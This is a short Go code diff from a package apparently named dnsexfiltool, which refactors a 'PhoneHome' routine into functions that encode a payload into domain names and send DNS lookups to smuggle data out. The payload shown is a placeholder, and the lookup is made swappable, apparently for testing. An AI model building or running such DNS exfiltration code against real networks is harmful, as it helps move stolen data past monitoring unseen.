@@ -1,21 +1,18 @@
 package dnsexfiltool
 
 import (
-	"log"
-	"net"
-
 	"github.com/sam-bee/security-itsalwaysdns/pkg/codec"
+	"log"
 )
 
-func PhoneHome (mainDomain string) {
+func exfilData(exfilPayload string, mainDomain string, dns DnsLookup) {
+	domains := domainsToQuery(exfilPayload, mainDomain)
+	performDnsLookups(domains, dns)
+}
 
-	exfilPayload := "hello world"
-
-	domainsToQuery := domainsToQuery(exfilPayload, mainDomain)
-
-	// Send DNS queries to the domainsToQuery
-	for _, domain := range domainsToQuery {
-		ip, err := net.LookupAddr(domain)
+func performDnsLookups(domains []string, dns DnsLookup) {
+	for _, domain := range domains {
+		ip, err := dns.Lookup(domain)
 		if err != nil {
 			log.Printf("Error looking up domain %s: %s", domain, err)
 		}
